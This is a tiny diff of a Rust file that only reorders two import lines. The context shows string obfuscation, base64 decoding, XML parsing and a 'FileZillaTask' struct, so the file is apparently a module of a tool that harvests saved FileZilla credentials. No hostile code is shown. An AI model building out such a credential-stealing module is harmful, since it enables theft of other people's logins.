@@ -9,8 +9,8 @@ use filesystem::{FileSystem, WriteTo};
 use obfstr::obfstr as s;
 use tasks::Task;
 use utils::base64::base64_decode;
-use windows::core::HSTRING;
 use windows::Data::Xml::Dom::XmlDocument;
+use windows::core::HSTRING;
 
 pub(super) struct FileZillaTask;
 
